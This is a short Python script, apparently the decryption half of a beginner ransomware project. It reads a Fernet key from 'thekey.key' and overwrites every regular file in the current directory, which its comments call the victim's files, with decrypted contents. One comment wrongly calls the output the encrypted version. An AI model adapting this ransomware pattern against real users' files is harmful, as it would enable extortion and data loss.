import os

#necessary for encryption/decryption
from cryptography.fernet import Fernet

#comment - a variable that will store file names of the victim's files
victims_files = []

#a for loop that will list each file in the victim's directory
for file in os.listdir():

        #files to be exempted from encryption
        if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
                continue

        #in case other file types exist that can't be modified ex. folders, zip files
        if os.path.isfile(file):
                victims_files.append(file)

#print the list of victim's files
print(victims_files)

#read the contents of the key
with open("thekey.key", "rb") as thekey:
        secretkey = thekey.read()

#create a for loop to examine and modify each file in the directory
for file in victims_files:

        #open each file and store its info inside the variable contents
        with open(file, "rb") as thefile:
                contents = thefile.read()

        #Use the key to decrypt the contents
        decrypt_contents = Fernet(secretkey).decrypt(contents)

        #overwrite the contents of each file using the encrypted version
        with open(file, "wb") as thefile:
                thefile.write(decrypt_contents)